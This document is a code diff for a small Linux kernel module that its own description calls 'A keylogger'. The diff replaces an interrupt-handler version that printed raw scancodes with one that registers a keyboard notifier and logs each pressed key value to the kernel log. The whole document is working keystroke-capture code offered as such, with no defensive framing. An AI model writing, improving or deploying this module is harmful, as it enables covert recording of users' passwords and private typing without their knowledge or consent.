@@ -1,48 +1,35 @@
 #include <linux/init.h>
 #include <linux/module.h>
-#include <linux/io.h>
-#include <linux/interrupt.h>
+#include <linux/notifier.h>
+#include <linux/keyboard.h>
 
-/* Intel i8042 keyboard controller I/O ports */
-#define KEYBOARD_IRQ 1
-#define KBD_STATUS_REG 0x64
-#define KBD_CNTL_REG   0x64
-#define KBD_DATA_REG   0x60
+static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
+  struct keyboard_notifier_param *param = data;
 
-#define kbd_read_input()     inb(KBD_DATA_REG)
-#define kbd_read_status()    inb(KBD_STATUS_REG)
-#define kbd_write_output(v)  outb(v, KBD_DATA_REG)
-#define kbd_write_command(v) outb(v, KBD_CNTL_REG)
-
-/* Interrupt handler */
-static irqreturn_t kloggg_kbd_irq_handler(int irq, void *dev_id) {
-    unsigned char scancode = kbd_read_input();
-    unsigned char status = kbd_read_status();
-    printk(KERN_INFO "Scancode: 0x%02x, Status: 0x%02x\n", scancode, status);
-    return IRQ_HANDLED;
+  if (action == KBD_KEYSYM && param->down) {
+    printk(KERN_INFO "Keylogger: keycode=%u\n", param->value);
+  }
+  
+  return NOTIFY_OK;
 }
 
-/* Module initialization */
-static int __init custom_init(void) {
-    int result = request_irq(KEYBOARD_IRQ, kloggg_kbd_irq_handler,
-                             IRQF_SHARED, "kloggg", (void *)(kloggg_kbd_irq_handler));
-    if (result) {
-        printk(KERN_ERR "Failed to register keyboard IRQ handler\n");
-        return result;
-    }
+static struct notifier_block kloggg_nb = {
+  .notifier_call = kloggg_log
+};
 
-    printk(KERN_INFO "Keylogger module loaded\n");
-    return 0;
+/* Module initialization */
+static int __init kloggg_init(void) {
+  register_keyboard_notifier(&kloggg_nb);
+  return 0;
 }
 
 /* Module cleanup */
-static void __exit custom_exit(void) {
-    free_irq(KEYBOARD_IRQ, (void *)(kloggg_kbd_irq_handler));
-    printk(KERN_INFO "Keylogger module unloaded\n");
+static void __exit kloggg_exit(void) {
+  unregister_keyboard_notifier(&kloggg_nb);
 }
 
-module_init(custom_init);
-module_exit(custom_exit);
+module_init(kloggg_init);
+module_exit(kloggg_exit);
 
 MODULE_AUTHOR("Nicholas Hubbard");
 MODULE_DESCRIPTION("A keylogger");
